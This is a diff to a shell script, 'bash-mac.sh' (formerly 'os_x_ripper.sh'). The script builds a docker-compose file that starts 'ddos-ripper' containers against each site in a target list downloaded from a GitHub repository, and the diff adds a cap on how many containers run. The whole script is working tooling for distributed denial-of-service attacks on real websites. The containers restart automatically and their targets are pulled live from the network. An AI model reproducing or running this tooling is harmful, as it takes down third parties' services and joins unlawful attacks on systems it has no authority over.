@@ -8,7 +8,7 @@ VERSION='2.1'
 TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
 
 function print_help {
-  echo -e "Usage: os_x_ripper.sh --mode install"
+  echo -e "Usage: bash-mac.sh --mode install"
   echo -e "--mode|-m - runmode (install, reinstall, start, stop)"
   echo -e "--number|-n - number of containers to start"
 }
@@ -42,12 +42,14 @@ function generate_compose {
     counter=1
 
     while read -r site_url; do
-        if [ ! -z $site_url ]; then
-            echo -e "  ddos-runner-$counter:" >> docker-compose.yml
-            echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-            echo -e "    restart: always" >> docker-compose.yml
-            echo -e "    command: $site_url" >> docker-compose.yml
-            ((counter++))
+        if [ $counter -le $amount ]; then
+            if [ ! -z $site_url ]; then
+                echo -e "  ddos-runner-$counter:" >> docker-compose.yml
+                echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+                echo -e "    restart: always" >> docker-compose.yml
+                echo -e "    command: $site_url" >> docker-compose.yml
+                ((counter++))
+            fi
         fi
     done < targets.txt
 }
